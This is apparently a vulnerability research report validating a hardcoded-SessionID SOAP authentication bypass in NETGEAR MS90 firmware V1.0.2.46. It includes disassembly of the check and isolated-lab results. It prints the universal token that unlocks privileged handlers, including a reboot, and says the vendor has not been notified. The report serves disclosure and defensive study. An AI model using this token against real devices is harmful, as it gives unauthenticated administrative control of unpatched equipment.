# MS90 V1.0.2.46 fixed-SessionID SOAP bypass validation

Date: 2026-07-24

## Result

The fixed-SessionID SOAP authentication bypass remains exploitable in NETGEAR's
latest published MS90 firmware, V1.0.2.46.

The result is confirmed both statically in the exact shipping `httpd` and
dynamically in a network-isolated full-system ARM lab:

- no SessionID: SOAP `ResponseCode 401`;
- random SessionID: SOAP `ResponseCode 401`;
- `12345678901234567890`: privileged `DeviceInfo#GetInfo` dispatch,
  `ResponseCode 000`;
- the successful response identifies model `MS90`, firmware `V1.0.2.46`, and
  internal software version `1.0.42`;
- the same fixed SessionID invokes `DeviceConfig#Reboot`, function index 79,
  returns `RebootResponse` with `ResponseCode 000`, and sets
  `sa_rebootRequired`.

The generic QEMU platform remains alive because it cannot complete the
board-specific Ethernet power-down and reset sequence. The authentication
decision, privileged handler dispatch, successful handler response, and reboot
decision are all produced by the genuine V1.0.2.46 daemon.

## Static confirmation

The V1.0.2.46 `httpd` retains all three authorization literals:

```text
0x0011cfb8  12345678901234567890
0x0011cfcd  soap_Auth_SessionID
0x0011d068  soap_getSessionID
```

The latest dispatcher function begins at `0x00067910`. For privileged table
entries, its authorization block:

1. extracts `SessionID`;
2. compares it to the NVRAM `soap_Auth_SessionID`;
3. dispatches immediately when that comparison succeeds;
4. otherwise compares it to `12345678901234567890`; and
5. branches to the same privileged dispatch block when the fixed-token
   comparison succeeds.

Relevant instructions:

```text
0x00067c5c  load "soap_Auth_SessionID"
0x00067c64  call acosNvramConfig_match
0x00067c6c  bne  0x00067ba0          ; privileged dispatch
0x00067c80  load "12345678901234567890"
0x00067c88  call strcmp
0x00067c90  beq  0x00067ba0          ; same privileged dispatch
```

This is direct confirmation that the literal is live authorization logic, not
an unused or diagnostic string.

## Dynamic controls

The exact V1.0.2.46 root filesystem was booted with the established MS90
full-system harness. The guest used QEMU user networking with `restrict=on` and
a loopback-only host forward. It was not exposed to the LAN or Internet.

### Missing SessionID

The genuine daemon parsed `DeviceInfo#GetInfo`, selected function index 7, failed
to extract a SessionID, and generated:

```text
<ResponseCode>401</ResponseCode>
```

### Random SessionID

The genuine daemon extracted `FRIDAY_INVALID_SESSION`, rejected it, and
generated:

```text
<ResponseCode>401</ResponseCode>
```

### Fixed SessionID

The genuine daemon extracted `12345678901234567890`, selected function index 7,
executed the handler, and generated:

```text
<ModelName>MS90</ModelName>
<Firmwareversion>V1.0.2.46</Firmwareversion>
<OthersoftwareVersion>1.0.42</OthersoftwareVersion>
<ResponseCode>000</ResponseCode>
```

This same-sized logical control set separates successful fixed-token
authorization from missing or arbitrary SessionIDs.

### Privileged reboot action

The fixed-token request for `DeviceConfig#Reboot` produced:

```text
get_service_and_api DeviceConfig:Reboot E
func_index ===79 E
soap_getSessionID ret 0, name SessionID: 12345678901234567890, content_len 20
function index 79 E
<m:RebootResponse ...>
<ResponseCode>000</ResponseCode>
sa_rebootRequired
```

This confirms unauthenticated access to a state-changing administrative action,
not only an informational method.

## Disposition

- Latest vendor-published MS90 firmware tested: **yes**
- Fixed universal SessionID present in live authorization logic: **yes**
- Missing/random SessionID controls rejected: **yes**
- Fixed SessionID accepted: **yes**
- Unauthenticated privileged reboot handler reached: **yes**
- Unauthenticated arbitrary code execution demonstrated: **no**
- Vendor contacted or submission made during this test: **no**

This establishes an unpatched, previously undocumented-in-public-MS90-advisories
pre-authentication SOAP bypass in the latest published firmware. Whether a CNA
assigns a new CVE remains a coordination and deduplication decision; the
technical current-version condition for describing it as a zero-day candidate
is satisfied.
